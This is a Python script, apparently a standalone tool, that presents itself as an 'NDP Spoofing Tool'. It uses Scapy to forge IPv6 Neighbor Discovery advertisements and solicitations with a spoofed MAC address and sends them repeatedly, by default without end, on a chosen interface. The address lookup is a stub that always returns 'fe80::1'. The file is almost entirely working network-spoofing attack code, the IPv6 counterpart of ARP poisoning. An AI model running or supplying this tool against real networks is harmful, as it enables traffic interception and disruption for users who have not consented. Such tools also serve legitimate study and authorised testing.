from scapy.all import *
import argparse
import time
from threading import Thread
from termcolor import colored

def get_ipv6_from_mac(mac_address, iface):
    # Simplified IPv6 address retrieval from MAC
    return "fe80::1"  # Dummy address; replace with actual logic

def send_ndp_packet(packet_type, src_mac, dst_mac, iface, count, interval, listen):
    target_ip = get_ipv6_from_mac(src_mac, iface)
    
    if packet_type == 'na':
        # Neighbor Advertisement packet
        packet = Ether(dst=dst_mac, src=src_mac) / IPv6(dst=target_ip) / ICMPv6ND_NA(tgt=target_ip, R=1, S=1, O=0) / ICMPv6NDOptDstLLAddr(lladdr=src_mac)
    elif packet_type == 'ns':
        # Neighbor Solicitation packet
        packet = Ether(dst=dst_mac, src=src_mac) / IPv6(dst='ff02::1') / ICMPv6ND_NS(tgt=target_ip) / ICMPv6NDOptSrcLLAddr(lladdr=src_mac)
    elif packet_type == 'ra':
        # Router Advertisement packet
        packet = Ether(dst=dst_mac, src=src_mac) / IPv6(dst='ff02::1') / ICMPv6ND_RA() / ICMPv6NDOptSrcLLAddr(lladdr=src_mac)
    elif packet_type == 'rs':
        # Router Solicitation packet
        packet = Ether(dst=dst_mac, src=src_mac) / IPv6(dst='ff02::2') / ICMPv6ND_RS() / ICMPv6NDOptSrcLLAddr(lladdr=src_mac)
    else:
        raise ValueError("Invalid packet type specified. Use 'na', 'ns', 'ra', or 'rs'.")

    # Listen for NA responses if requested
    if listen and packet_type == 'ns':
        listener_thread = Thread(target=listen_for_na, args=(target_ip, iface))
        listener_thread.start()

    sent_count = 0
    while count == 0 or sent_count < count:
        sendp(packet, iface=iface, verbose=False)
        print(
            colored("Injected Magic Packet ", "yellow") +
            colored(packet_type.upper(), "blue") +
            colored(" for ", "cyan") +
            target_ip +
            colored(" Spoofing MAC ", "cyan") +
            colored(src_mac, "green") +
            colored(" Over ", "cyan") +
            colored(dst_mac, "red")
        )
        sent_count += 1
        time.sleep(interval)

def listen_for_na(target_ip, iface):
    def na_response_callback(pkt):
        if ICMPv6ND_NA in pkt and pkt[ICMPv6ND_NA].tgt == target_ip:
            src_mac = pkt[Ether].src
            print(colored(f"Received NA from {src_mac} claiming IP {target_ip}", "yellow"))

    print("Listening for NA responses...")
    sniff(iface=iface, filter="icmp6 and (icmp6[icmp6type] == 136)", prn=na_response_callback, store=0)

def main():
    parser = argparse.ArgumentParser(description="NDP Spoofing Tool (Similar to ARP Spoofing)")
    parser.add_argument("--src-mac", required=True, help="Spoofed source MAC address")
    parser.add_argument("--dst-mac", required=True, help="Destination MAC address")
    parser.add_argument("--iface", required=True, help="Network interface to use")
    parser.add_argument("--count", type=int, default=0, help="Number of packets to send (0 for unlimited)")
    parser.add_argument("--interval", type=float, default=1.0, help="Time interval between packets in seconds")
    parser.add_argument("--packet-type", choices=['na', 'ns', 'ra', 'rs'], required=True, help="Type of NDP packet to send (na, ns, ra, rs)")
    parser.add_argument("--listen", action='store_true', help="Listen for NA responses to NS packets")

    args = parser.parse_args()

    # Send NDP packets
    send_ndp_packet(args.packet_type, args.src_mac, args.dst_mac, args.iface, args.count, args.interval, args.listen)

if __name__ == "__main__":
    main()
